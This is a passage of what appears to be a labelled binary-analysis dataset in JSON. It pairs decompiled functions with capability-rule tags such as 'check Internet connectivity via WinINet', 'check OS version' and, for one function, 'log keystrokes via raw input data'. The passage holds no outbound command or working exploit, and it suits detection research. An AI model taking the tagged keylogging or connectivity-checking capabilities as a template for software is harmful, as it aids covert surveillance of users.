            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.00064248(int64_t *arg1, ulong arg2, ulong arg3)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int64_t arg2_00;\n    uint32_t auStackX32 [2];\n    \n    iVar2 = fcn.00063c38(arg1);\n    if (iVar2 == 0) {\n        if ((***arg1 < 0x85) || (pcVar1 = *(**arg1 + 0x21),  pcVar1 == NULL)) {\n            fcn.00063b30(arg1);\n            iVar2 = 0x21590001;\n        }\n        else {\n            iVar2 = (*pcVar1)(arg1, arg2);\n            if ((iVar2 != 0) && (*(*arg1 + 8) != 0)) {\n                iVar2 = 0x21590006;\n            }\n            fcn.00063b30(arg1);\n        }\n    }\n    if (iVar2 == 0x21590001) {\n        arg2_00 = fcn.0006380c(arg2, auStackX32);\n        if (arg2_00 == 0) {\n            iVar2 = 0x21590004;\n        }\n        else {\n            iVar2 = fcn.00063f90(arg1, arg2_00, auStackX32[0], arg3);\n            fcn.00030d24(arg2_00);\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 329
    },
    "00064304": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.00064304(int64_t *arg1, ulong arg2, int64_t *arg3, uint *arg4)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int64_t arg2_00;\n    uint32_t in_stack_00000028;\n    uint in_stack_00000030;\n    uint64_t in_stack_ffffffffffffff98;\n    uint32_t auStack72 [4];\n    \n    iVar2 = fcn.00063c38(arg1);\n    if (iVar2 == 0) {\n        if ((***arg1 < 0x8d) || (pcVar1 = *(**arg1 + 0x23),  pcVar1 == NULL)) {\n            fcn.00063b30(arg1);\n            iVar2 = 0x21590001;\n        }\n        else {\n            iVar2 = (*pcVar1)(arg1, arg2, arg3, arg4, in_stack_ffffffffffffff98 & 0xffffffff00000000 | in_stack_00000028\n                              , in_stack_00000030);\n            if ((iVar2 != 0) || (*arg3 == 0)) {\n                if (*(*arg1 + 8) != 0) {\n                    iVar2 = 0x21590006;\n                }\n                fcn.00063b30(arg1);\n                *arg3 = 0;\n                *arg4 = 0;\n            }\n        }\n    }\n    if (iVar2 == 0x21590001) {\n        arg2_00 = fcn.0006380c(arg2, auStack72);\n        if (arg2_00 == 0) {\n            iVar2 = 0x21590004;\n        }\n        else {\n            iVar2 = fcn.00064098(arg1, arg2_00, auStack72[0], arg3);\n            fcn.00030d24(arg2_00);\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 429
    },
    "00064414": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.00064414(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t *puVar3;\n    ulong uVar4;\n    \n    iVar2 = 0;\n    puVar3 = 0x7da90;\n    do {\n        uVar1 = arg1 >> 0x1f;\n        if (*puVar3 == arg1) {\n            if ((arg1 == 0xffffffff) || ((arg1 ^ uVar1) - uVar1 < 0x186a1)) {\n                uVar4 = 0x160d8;\n            }\n            else {\n                uVar4 = 0x160e8;\n            }\n            fcn.00044350(arg3, arg4, uVar4, arg2);\n            return 1;\n        }\n        if ((arg1 == 0xffffffff) || (uVar4 = 0x16108,  (arg1 ^ uVar1) - uVar1 < 0x186a1)) {\n            uVar4 = 0x160f8;\n        }\n        fcn.00044350(arg3, arg4, uVar4, arg2);\n        iVar2 = iVar2 + 1;\n        puVar3 = puVar3 + 4;\n    } while (iVar2 == 0);\n    return 0;\n}\n",
        "token_count": 310
    },
    "00064668": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00064668(int64_t **arg1)\n\n{\n    int64_t *piVar1;\n    int64_t *arg1_00;\n    \n    arg1_00 = *arg1;\n    if (0 < arg1_00[2]) {\n        LOCK();\n        piVar1 = arg1_00 + 2;\n        *piVar1 = *piVar1 + -1;\n        if (*piVar1 == 0) {\n            fcn.0005ceb0(arg1, 3);\n            (**(**arg1 + 0x2c))(arg1, *(arg1_00 + 0xc));\n            fcn.00030d24(arg1_00);\n            LOCK();\n            *0x8e2e0 = *0x8e2e0 + -1;\n        }\n    }\n    return;\n}\n",
        "token_count": 185
    },
    "000646b8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.000646b8(ulong *arg1, int64_t *arg2, ulong arg3, ulong arg4)\n\n{\n    int64_t *piVar1;\n    char cVar2;\n    uint32_t uVar3;\n    char *arg1_00;\n    uchar *puVar4;\n    int64_t iVar5;\n    uint64_t uVar6;\n    int64_t iVar7;\n    int32_t iVar8;\n    char *pcVar9;\n    uint64_t uVar10;\n    int64_t iVar11;\n    \n    iVar11 = 0;\n    *arg1 = 0;\n    iVar5 = *arg2;\n    piVar1 = arg2;\n    do {\n        if (iVar5 == 0) {\n            return 0x21590005;\n        }\n        arg1_00 = fcn.00030d48(*piVar1);\n        if (arg1_00 == NULL) {\n            return 0x21590004;\n        }\n        puVar4 = fcn.0006682a(arg1_00, 0x2e);\n        if (puVar4 != NULL) {\n            *puVar4 = 0;\n            puVar4 = puVar4 + 1;\n        }\n        iVar5 = fcn.00063888(arg1_00);\n        if (iVar5 == 0) {\n            fcn.00030d24(arg1_00);\n            if (*0x7d9d8 != 0) {\n                uVar6 = (**(*0x7d9d8 + 0x14))(arg1, *piVar1, arg3, arg4);\n                uVar10 = uVar6 & 0xffffffff;\n                if ((uVar6 == 0) && (iVar5 = *0x7d9d8,  *0x7d9d8 != 0)) goto code_r0x00064801;\n                if (uVar6 != 0x21590005) {\n                    return uVar6;\n                }\n                goto code_r0x000647ce;\n            }\n        }\n        else {\n            if (puVar4 == NULL) {\n                iVar7 = -1;\n                pcVar9 = arg1_00;\n                do {\n                    if (iVar7 == 0) break;\n                    iVar7 = iVar7 + -1;\n                    cVar2 = *pcVar9;\n                    pcVar9 = pcVar9 + 1;\n                } while (cVar2 != '\\0');\n                iVar8 = ~iVar7 - 1;\n            }\n            else {\n                iVar8 = puVar4 - arg1_00;\n            }\n            fcn.00030d24(arg1_00);\n            uVar3 = (**(iVar5 + 0x14))(arg1, iVar8 + *piVar1, arg3);\n            uVar10 = uVar3;\ncode_r0x000647ce:\n            if (iVar5 != 0) {\n                if (uVar10 != 0) {\n                    return uVar10;\n                }\ncode_r0x00064801:\n                iVar8 = fcn.00064538(*arg1, iVar5);\n                if (iVar8 != 0) {\n                    return uVar10;\n                }\n                (**(iVar5 + 0x2c))(*arg1, 0);\n                *arg1 = 0;\n                return 0x21590004;\n            }\n        }\n        iVar11 = iVar11 + 1;\n        piVar1 = arg2 + iVar11;\n        iVar5 = *piVar1;\n    } while( true );\n}\n",
        "token_count": 783
    },
    "00064834": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.00064834(ulong *arg1, int64_t *arg2, ulong arg3, ulong arg4)\n\n{\n    int64_t *piVar1;\n    char cVar2;\n    uint32_t uVar3;\n    char *arg1_00;\n    uchar *puVar4;\n    int64_t iVar5;\n    uint64_t uVar6;\n    int64_t iVar7;\n    int32_t iVar8;\n    uint64_t uVar9;\n    int64_t iVar10;\n    \n    iVar10 = 0;\n    *arg1 = 0;\n    iVar5 = *arg2;\n    piVar1 = arg2;\n    do {\n        if (iVar5 == 0) {\n            return 0x21590005;\n        }\n        arg1_00 = fcn.00030d48(*piVar1);\n        if (arg1_00 == NULL) {\n            return 0x21590004;\n        }\n        puVar4 = fcn.0006682a(arg1_00, 0x2e);\n        if (puVar4 != NULL) {\n            *puVar4 = 0;\n            puVar4 = puVar4 + 1;\n        }\n        iVar5 = fcn.00063888(arg1_00);\n        fcn.00030d24(arg1_00);\n        if (iVar5 == 0) {\n            if (*0x7d9d8 != 0) {\n                uVar6 = (**(*0x7d9d8 + 0x1c))(arg1, *piVar1, arg3, arg4);\n                uVar9 = uVar6 & 0xffffffff;\n                if ((uVar6 == 0) && (iVar5 = *0x7d9d8,  *0x7d9d8 != 0)) goto code_r0x00064975;\n                if (uVar6 != 0x21590005) {\n                    return uVar6;\n                }\n                goto code_r0x00064942;\n            }\n        }\n        else {\n            if (puVar4 == NULL) {\n                iVar7 = -1;\n                do {\n                    if (iVar7 == 0) break;\n                    iVar7 = iVar7 + -1;\n                    cVar2 = *arg1_00;\n                    arg1_00 = arg1_00 + 1;\n                } while (cVar2 != '\\0');\n                iVar8 = ~iVar7 - 1;\n            }\n            else {\n                iVar8 = puVar4 - arg1_00;\n            }\n            uVar3 = (**(iVar5 + 0x1c))(arg1, iVar8 + *piVar1, arg3);\n            uVar9 = uVar3;\ncode_r0x00064942:\n            if (iVar5 != 0) {\n                if (uVar9 != 0) {\n                    return uVar9;\n                }\ncode_r0x00064975:\n                iVar8 = fcn.00064538(*arg1, iVar5);\n                if (iVar8 != 0) {\n                    return uVar9;\n                }\n                (**(iVar5 + 0x2c))(*arg1, 0);\n                *arg1 = 0;\n                return 0x21590004;\n            }\n        }\n        iVar10 = iVar10 + 1;\n        piVar1 = arg2 + iVar10;\n        iVar5 = *piVar1;\n    } while( true );\n}\n",
        "token_count": 757
    },
    "00064abc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.00064abc(int64_t *arg1, ulong arg2, ulong arg3)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    \n    uVar3 = fcn.00064a60(arg1);\n    if (uVar3 == 0) {\n        if ((***arg1 < 0x3d) || (pcVar1 = *(**arg1 + 0xf),  pcVar1 == NULL)) {\n            uVar3 = 0x21590001;\n        }\n        else {\n            uVar2 = (*pcVar1)(arg1, arg2, arg3);\n            uVar3 = uVar2;\n            if ((uVar2 != 0) && (*(*arg1 + 8) != 0)) {\n                uVar3 = 0x21590006;\n            }\n        }\n        fcn.00064668(arg1);\n    }\n    return uVar3;\n}\n",
        "token_count": 216
    },
    "00064b24": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.00064b24(int64_t *arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    uint in_stack_00000028;\n    \n    uVar3 = fcn.00064a60(arg1);\n    if (uVar3 == 0) {\n        if ((***arg1 < 0x8d) || (pcVar1 = *(**arg1 + 0x23),  pcVar1 == NULL)) {\n            uVar3 = 0x21590001;\n        }\n        else {\n            uVar2 = (*pcVar1)(arg1, arg2, arg3, arg4, in_stack_00000028);\n            uVar3 = uVar2;\n            if ((uVar2 != 0) && (*(*arg1 + 8) != 0)) {\n                uVar3 = 0x21590006;\n            }\n        }\n        fcn.00064668(arg1);\n    }\n    return uVar3;\n}\n",
        "token_count": 241
    },
    "00064bd8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.00064bd8(int64_t *arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    \n    uVar3 = fcn.00064a60(arg1);\n    if (uVar3 == 0) {\n        if ((***arg1 < 0x4d) || (pcVar1 = *(**arg1 + 0x13),  pcVar1 == NULL)) {\n            uVar3 = 0x21590001;\n        }\n        else {\n            uVar2 = (*pcVar1)(arg1, arg2, arg3, arg4);\n            uVar3 = uVar2;\n            if ((uVar2 != 0) && (*(*arg1 + 8) != 0)) {\n                uVar3 = 0x21590006;\n            }\n        }\n        fcn.00064668(arg1);\n    }\n    return uVar3;\n}\n",
        "token_count": 225
    },
    "00064c48": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.00064c48(int64_t *arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    ulong in_stack_00000028;\n    int64_t *in_stack_00000030;\n    uint *in_stack_00000038;\n    uint in_stack_00000040;\n    uint in_stack_00000048;\n    \n    uVar3 = fcn.00064a60(arg1);\n    if (uVar3 == 0) {\n        if ((***arg1 < 0x55) || (pcVar1 = *(**arg1 + 0x15),  pcVar1 == NULL)) {\n            fcn.00064668(arg1);\n            uVar3 = 0x21590001;\n        }\n        else {\n            uVar2 = (*pcVar1)(arg1, arg2, arg3, arg4, in_stack_00000028, in_stack_00000030, in_stack_00000038, \n                              in_stack_00000040, in_stack_00000048);\n            uVar3 = uVar2;\n            if ((uVar2 != 0) || (*in_stack_00000030 == 0)) {\n                if (*(*arg1 + 8) != 0) {\n                    uVar3 = 0x21590006;\n                }\n                fcn.00064668(arg1);\n                *in_stack_00000030 = 0;\n                *in_stack_00000038 = 0;\n            }\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 360
    },
    "00064d28": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.00064d28(int64_t *arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    ulong in_stack_00000028;\n    uint in_stack_00000030;\n    \n    uVar3 = fcn.00064a60(arg1);\n    if (uVar3 == 0) {\n        if ((***arg1 < 0x5d) || (pcVar1 = *(**arg1 + 0x17),  pcVar1 == NULL)) {\n            uVar3 = 0x21590001;\n        }\n        else {\n            uVar2 = (*pcVar1)(arg1, arg2, arg3, arg4, in_stack_00000028, in_stack_00000030);\n            uVar3 = uVar2;\n            if ((uVar2 != 0) && (*(*arg1 + 8) != 0)) {\n                uVar3 = 0x21590006;\n            }\n        }\n        fcn.00064668(arg1);\n    }\n    return uVar3;\n}\n",
        "token_count": 257
    },
    "00064db0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.00064db0(int64_t *arg1, ulong arg2, int64_t *arg3, uint *arg4)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    uint in_stack_00000028;\n    uint in_stack_00000030;\n    \n    uVar3 = fcn.00064a60(arg1);\n    if (uVar3 == 0) {\n        if ((***arg1 < 0x65) || (pcVar1 = *(**arg1 + 0x19),  pcVar1 == NULL)) {\n            fcn.00064668(arg1);\n            uVar3 = 0x21590001;\n        }\n        else {\n            uVar2 = (*pcVar1)(arg1, arg2, arg3, arg4, in_stack_00000028, in_stack_00000030);\n            uVar3 = uVar2;\n            if ((uVar2 != 0) || (*arg3 == 0)) {\n                if (*(*arg1 + 8) != 0) {\n                    uVar3 = 0x21590006;\n                }\n                fcn.00064668(arg1);\n                *arg3 = 0;\n                *arg4 = 0;\n            }\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 298
    },
    "00064e50": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.00064e50(int64_t *arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    uint in_stack_00000028;\n    \n    uVar3 = fcn.00064a60(arg1);\n    if (uVar3 == 0) {\n        if ((***arg1 < 0x6d) || (pcVar1 = *(**arg1 + 0x1b),  pcVar1 == NULL)) {\n            uVar3 = 0x21590001;\n        }\n        else {\n            uVar2 = (*pcVar1)(arg1, arg2, arg3, arg4, in_stack_00000028);\n            uVar3 = uVar2;\n            if ((uVar2 != 0) && (*(*arg1 + 8) != 0)) {\n                uVar3 = 0x21590006;\n            }\n        }\n        fcn.00064668(arg1);\n    }\n    return uVar3;\n}\n",
        "token_count": 242
    },
    "00064ecc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.00064ecc(int64_t *arg1, ulong arg2, ulong arg3, int64_t *arg4)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    uint *in_stack_00000028;\n    uint in_stack_00000030;\n    uint in_stack_00000038;\n    \n    uVar3 = fcn.00064a60(arg1);\n    if (uVar3 == 0) {\n        if ((***arg1 < 0x75) || (pcVar1 = *(**arg1 + 0x1d),  pcVar1 == NULL)) {\n            fcn.00064668(arg1);\n            uVar3 = 0x21590001;\n        }\n        else {\n            uVar2 = (*pcVar1)(arg1, arg2, arg3, arg4, in_stack_00000028, in_stack_00000030, in_stack_00000038);\n            uVar3 = uVar2;\n            if ((uVar2 != 0) || (*arg4 == 0)) {\n                if (*(*arg1 + 8) != 0) {\n                    uVar3 = 0x21590006;\n                }\n                fcn.00064668(arg1);\n                *arg4 = 0;\n                *in_stack_00000028 = 0;\n            }\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 318
    },
    "00064fb8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.00064fb8(int64_t *arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int64_t arg3_00;\n    uint32_t in_stack_00000028;\n    uint64_t in_stack_ffffffffffffffa8;\n    uint32_t auStack72 [6];\n    \n    iVar2 = fcn.00064a60(arg1);\n    if (iVar2 == 0) {\n        if ((***arg1 < 0x9d) || (pcVar1 = *(**arg1 + 0x27),  pcVar1 == NULL)) {\n            fcn.00064668(arg1);\n            iVar2 = 0x21590001;\n        }\n        else {\n            iVar2 = (*pcVar1)(arg1, arg2, arg3, arg4, in_stack_ffffffffffffffa8 & 0xffffffff00000000 | in_stack_00000028\n                             );\n            if ((iVar2 != 0) && (*(*arg1 + 8) != 0)) {\n                iVar2 = 0x21590006;\n            }\n            fcn.00064668(arg1);\n        }\n    }\n    if (iVar2 == 0x21590001) {\n        arg3_00 = fcn.0006380c(arg3, auStack72);\n        if (arg3_00 == 0) {\n            iVar2 = 0x21590004;\n        }\n        else {\n            iVar2 = fcn.00064d28(arg1, arg2, arg3_00, auStack72[0]);\n            fcn.00030d24(arg3_00);\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 383
    },
    "00065098": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.00065098(char **arg1, int64_t arg2, uint64_t arg3, char **arg4)\n\n{\n    char cVar1;\n    int64_t iVar2;\n    ulong uVar3;\n    uint64_t uVar4;\n    char *pcVar5;\n    \n    if (**arg1 == '\\0') {\n        uVar3 = 0;\n    }\n    else {\n        iVar2 = fcn.0006682a(*arg1, 0x3d);\n        if (iVar2 == 0) {\n            if (arg3 != 0) {\n                fcn.00066830(arg2, *arg1, arg3);\n                *((arg3 - 1) + arg2) = 0;\n            }\n            uVar4 = 0xffffffffffffffff;\n            pcVar5 = *arg1;\n            do {\n                if (uVar4 == 0) break;\n                uVar4 = uVar4 - 1;\n                cVar1 = *pcVar5;\n                pcVar5 = pcVar5 + 1;\n            } while (cVar1 != '\\0');\n            *arg4 = *arg1 + (~uVar4 - 1);\n        }\n        else {\n            iVar2 = iVar2 - *arg1;\n            if (arg3 != 0) {\n                if (arg3 < iVar2 + 1U) {\n                    iVar2 = arg3 - 1;\n                }\n                fcn.0006670a(arg2, *arg1, iVar2);\n                *(iVar2 + arg2) = 0;\n            }\n            *arg4 = *arg1 + iVar2 + 1;\n        }\n        uVar4 = 0xffffffffffffffff;\n        pcVar5 = *arg1;\n        do {\n            if (uVar4 == 0) break;\n            uVar4 = uVar4 - 1;\n            cVar1 = *pcVar5;\n            pcVar5 = pcVar5 + 1;\n        } while (cVar1 != '\\0');\n        uVar3 = 1;\n        *arg1 = *arg1 + ~uVar4;\n    }\n    return uVar3;\n}\n",
        "token_count": 472
    },
    "000652b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\nulong fcn.000652b0(int32_t *arg1, ushort *arg2)\n\n{\n    ulong uVar1;\n    \n    if ((*arg1 == 1) && (*(arg1 + 6) == 2)) {\n        *arg2 = 2;\n        fcn.0006677c(arg2, 0, 0x10);\n        *(arg2 + 2) = *(arg1 + 10);\n        arg2[1] = *(arg1 + 2);\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = 0xc0000001;\n    }\n    return uVar1;\n}\n",
        "token_count": 142
    },
    "00065ccc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.00065ccc(ulong arg1, ulong *arg2)\n\n{\n    ulong uVar1;\n    uchar auStackX24 [16];\n    \n    if (arg1 == 0x3ea) {\n        if (*0x8e350 == 0) {\n            fcn.000324cc(0x8e2f0);\n            *0x8e310 = 0x65720;\n            *0x8e308 = 0x656a8;\n            *0x8e318 = 0x657c4;\n            *0x8e348 = 0;\n            *0x8e320 = 0x65a40;\n            *0x8e350 = 1;\n            *0x8e328 = 0x65b94;\n            *0x8e330 = 0x65830;\n            *0x8e338 = 0x65a38;\n            *0x8e340 = 0x65c14;\n        }\n        fcn.00032650(0x8e2f0, auStackX24, 1);\n        *arg2 = 0x8e308;\n        fcn.00032684(0x8e2f0, auStackX24, 1);\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = 0x21590001;\n    }\n    return uVar1;\n}\n",
        "token_count": 313
    },
    "00018f00": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.00018f00(int64_t arg1, ulong arg2)\n\n{\n    uint16_t *puVar1;\n    bool bVar2;\n    int32_t iVar3;\n    int64_t *piVar4;\n    ulong *puVar5;\n    uint64_t arg1_00;\n    int16_t *piVar6;\n    int64_t *piVar7;\n    int64_t *piVar8;\n    int64_t *arg1_01;\n    int64_t aiStackX24 [2];\n    uint16_t uStack88;\n    ushort uStack86;\n    int64_t iStack80;\n    \n    piVar8 = NULL;\n    bVar2 = false;\n    piVar7 = NULL;\n    uStack88 = 0;\n    uStack86 = 0;\n    iStack80 = 0;\n    aiStackX24[0] = 0;\n    if (*0x7e200 == NULL) {\n        return;\n    }\n    if (arg1 == 0) {\n        return;\n    }\n    puVar1 = *(arg1 + 0x10);\n    if (puVar1 == NULL) {\n        return;\n    }\n    if (*(puVar1 + 4) == 0) {\n        return;\n    }\n    if (*puVar1 < 2) {\n        return;\n    }\n    for (piVar6 = *(puVar1 + 4) + (*puVar1 - 1 & 0xfffffffffffffffeU); *piVar6 == 0; piVar6 = piVar6 + -1) {\n    }\n    fcn.000324dc(0x7e1e8, 0);\n    for (puVar5 = *0x7e200; puVar5 != NULL; puVar5 = *puVar5) {\n        if ((puVar5[1] * 2 <= *puVar1) && (iVar3 = fcn.000666ec(piVar6 + (1 - puVar5[1])),  iVar3 == 0)) {\n            bVar2 = true;\n            break;\n        }\n    }\n    fcn.000325d8(0x7e1e8, 0);\n    arg1_01 = piVar8;\n    if (!bVar2) goto code_r0x000191b8;\n    if (*(arg1 + 8) == 0) {\n        piVar4 = *(puVar1 + 4);\n        arg1_00 = *puVar1;\n        if (*piVar4 == *0x11a78) {\n            piVar4 = piVar4 + 1;\n            arg1_00 = arg1_00 - 8;\n        }\n        arg1_01 = piVar7;\n        if (arg1_00 < 2) goto code_r0x000191b8;\n    }\n    else {\n        iVar3 = (*_fcn.00011150)(arg2, 0, **0x11180, 0, aiStackX24, 0);\n        if (iVar3 != 0) {\n            return;\n        }\n        if (((*(aiStackX24[0] + 0x60) == 0) || (arg1_01 = piVar7,  *(aiStackX24[0] + 0x58) < 2)) ||\n           (iVar3 = fcn.00066776(*(aiStackX24[0] + 8), &uStack88),  iVar3 != 0)) goto code_r0x000191b8;\n        arg1_00 = *(aiStackX24[0] + 0x58) + uStack88;\n        piVar4 = fcn.00030c98(arg1_00);\n        arg1_01 = piVar4;\n        if (piVar4 == NULL) goto code_r0x000191b8;\n        fcn.0006670a(piVar4, iStack80, uStack88);\n        fcn.0006670a(uStack88 + piVar4, *(aiStackX24[0] + 0x60), *(aiStackX24[0] + 0x58));\n        piVar8 = piVar4;\n    }\n    fcn.000324dc(0x7e220, 0);\n    for (puVar5 = *0x7e238; puVar5 != NULL; puVar5 = *puVar5) {\n        iVar3 = fcn.0006674c(puVar5 + 6, piVar4, arg1_00, 2, 2);\n        if (iVar3 == 0) break;\n    }\n    fcn.000325d8(0x7e220, 0);\n    arg1_01 = piVar8;\n    if ((puVar5 == NULL) && (puVar5 = fcn.00030c98(arg1_00 + 0x32),  puVar5 != NULL)) {\n        fcn.0006670a(puVar5 + 6, piVar4, arg1_00);\n        *(puVar5 + (arg1_00 & 0xfffffffffffffffe) + 0x30) = 0;\n        puVar5[1] = 0;\n        iVar3 = fcn.0003205c(puVar5 + 2, 0x11);\n        if (iVar3 == 0) {\n            *(puVar5 + 2) = 0;\n        }\n        fcn.000324dc(0x7e220, 1);\n        *puVar5 = *0x7e238;\n        *0x7e238 = puVar5;\n        fcn.000325d8(0x7e220, 1);\n        fcn.0002fcb8(0x7e208);\n    }\ncode_r0x000191b8:\n    if (iStack80 != 0) {\n        (**0x11170)(iStack80, 0);\n    }\n    fcn.00030d24(arg1_01);\n    if (aiStackX24[0] != 0) {\n        (*_fcn.000115b8)();\n    }\n    return;\n}\n",
        "token_count": 1348
    },
    "0001994c": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
